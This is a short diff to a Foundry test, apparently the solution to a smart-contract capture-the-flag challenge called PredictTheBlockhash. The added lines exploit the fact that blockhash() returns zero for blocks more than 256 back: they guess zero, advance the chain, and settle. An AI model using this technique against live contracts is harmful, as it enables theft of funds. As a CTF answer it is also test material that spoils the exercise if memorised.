@@ -24,7 +24,12 @@ contract PredictTheBlockhashTest is Test {
         vm.roll(blockNumber + 10);
 
         // Put your solution here
+     
+        exploitContract.callLockInGuess{value: 1 ether}(bytes32(0));
 
+        // more than 256 block, the blockHash() will be 0
+        vm.roll(blockNumber + 268);
+        exploitContract.callSettle();
         _checkSolved();
     }
 
